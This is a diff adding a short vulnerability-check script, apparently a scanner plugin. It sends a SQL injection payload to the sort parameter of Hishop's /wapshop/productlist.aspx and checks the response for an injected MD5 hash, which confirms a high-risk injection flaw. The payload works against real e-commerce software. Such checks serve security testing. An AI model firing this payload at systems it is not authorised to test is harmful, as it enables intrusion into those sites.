@@ -1,0 +1,13 @@
+#request url = var
+#define payload = /wapshop/productlist.aspx?sort=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)))
+#define bug = 81dc9bdb52d04dc20036dbd8313ed055
+#define info = 存在Hishop SQL注入漏洞...(高危)
+
+function main(args)
+{
+	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
